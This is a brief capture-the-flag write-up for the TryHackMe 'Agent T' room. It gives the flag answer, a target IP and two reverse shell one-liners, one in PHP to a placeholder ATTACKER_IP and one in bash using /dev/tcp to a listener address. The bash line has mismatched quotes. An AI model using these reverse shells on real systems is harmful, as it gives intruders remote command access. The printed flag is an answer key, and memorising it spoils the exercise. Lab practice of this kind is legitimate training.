# Agent T

## Task 1: Find the flag

![](https://tryhackme-images.s3.amazonaws.com/room-icons/5dbc4e7d8515e7bc05b7742f26944ae9.png)

* Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

> (\*) After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.

---

* Answer the questions below
* What is the flag?

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

```bash
export IP=10.10.184.78

```

> you may need to escape qoutes in order to make the expoit work


```bash

php -r '$sock=fsockopen("ATTACKER_IP",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash

'bash -c \"bash -i >& /dev/tcp/10.8.160.106/9001' 0>&1\"'
```